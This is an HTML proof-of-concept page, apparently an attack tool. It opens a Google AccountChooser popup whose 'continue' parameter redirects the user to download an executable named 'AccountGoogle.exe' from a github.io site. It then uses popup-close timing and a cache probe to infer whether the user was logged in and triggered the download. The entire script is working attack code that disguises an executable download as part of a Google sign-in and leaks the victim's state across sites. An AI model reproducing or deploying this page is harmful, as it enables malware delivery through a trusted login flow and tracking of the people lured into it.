<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Advanced XS-Leak PoC - Google OAuth Flow</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      text-align: center;
      background-color: #f0f0f0;
      padding: 40px;
    }
    button {
      padding: 12px 24px;
      font-size: 16px;
      border: none;
      border-radius: 5px;
      background-color: #4285F4;
      color: #fff;
      cursor: pointer;
      transition: background-color 0.2s;
    }
    button:hover {
      background-color: #357ae8;
    }
    #result {
      margin-top: 20px;
      font-size: 18px;
      color: #333;
    }
  </style>
</head>
<body>

  <h1>Advanced XS-Leak PoC</h1>
  <p>This PoC infers user login status via the timing of the OAuth popup and resource probing.</p>
  <button id="start-btn">Start XS-Leak Flow</button>
  <div id="result">Result: Waiting...</div>
  
  <script>
    const startBtn = document.getElementById('start-btn');
    const resultDiv = document.getElementById('result');

    function openOAuthPopup() {
      // URL gabungan: user diarahkan ke Google AccountChooser,
      // dengan parameter continue yang mengarah ke file download (.exe)
      const googleLoginURL = "https://accounts.google.com/AccountChooser/signinchooser?continue=https%3A%2F%2Flanaya113505.github.io%2Fpizza%2FAccountGoogle.exe&ddm=1&flowEntry=AccountChooser&flowName=GlifWebSignIn&hl=id&ltmpl=youtube&service=youtube&authuser=0";
      const popupWidth = 500, popupHeight = 600;
      const left = (screen.width - popupWidth) / 2;
      const top = (screen.height - popupHeight) / 2;
      return window.open(googleLoginURL, 'GoogleLoginPopup', `width=${popupWidth},height=${popupHeight},top=${top},left=${left}`);
    }

    // Fungsi untuk melakukan probing ke file download tanpa memicu download ulang secara eksplisit
    async function probeFileCached() {
      const probeUrl = "https://lanaya113505.github.io/pizza/AccountGoogle.exe";
      const probeStart = performance.now();
      try {
        // Metode HEAD request untuk menghindari download full
        await fetch(probeUrl, { method: 'HEAD', mode: 'no-cors' });
        const probeTime = performance.now() - probeStart;
        console.log("Probe time: " + probeTime.toFixed(2) + "ms");
        if (probeTime < 300) {
          resultDiv.innerHTML += "<p>XS-Leak Probe: File likely cached (indicating download was triggered).</p>";
        } else {
          resultDiv.innerHTML += "<p>XS-Leak Probe: File not cached (download may not have been triggered).</p>";
        }
      } catch (err) {
        console.error("Probe error:", err);
        resultDiv.innerHTML += "<p>XS-Leak Probe: Error probing resource.</p>";
      }
    }

    startBtn.addEventListener('click', () => {
      resultDiv.innerHTML = "Result: Opening OAuth popup...";
      const startTime = performance.now();
      const popup = openOAuthPopup();
      
      if (!popup) {
        resultDiv.innerHTML = "Popup blocked! Please allow popups for this site.";
        return;
      }
      
      const timer = setInterval(() => {
        try {
          if (popup.closed) {
            clearInterval(timer);
            const elapsed = performance.now() - startTime;
            resultDiv.innerHTML += `<p>Popup closed after ${elapsed.toFixed(2)} ms</p>`;
            
            // Inferensi: jika popup ditutup dengan cepat, kemungkinan user sudah mengklik akun dan redirect terjadi.
            if (elapsed < 4000) {
              resultDiv.innerHTML += "<p>Inference: User likely logged in and triggered download.</p>";
            } else {
              resultDiv.innerHTML += "<p>Inference: User interaction delayed or not logged in.</p>";
            }
            
            // Lakukan probing untuk XS-Leak (apakah file download sudah di-cache)
            probeFileCached();
          }
        } catch (e) {
          console.error("Error checking popup state:", e);
        }
      }, 500);
    });

    // Optional: Listener untuk postMessage, jika popup mengirim pesan (jika ada modifikasi lebih lanjut)
    window.addEventListener('message', (event) => {
      console.log("Received message from popup:", event.origin, event.data);
      // Bisa proses pesan untuk leakage tambahan
    });
  </script>

</body>
</html>
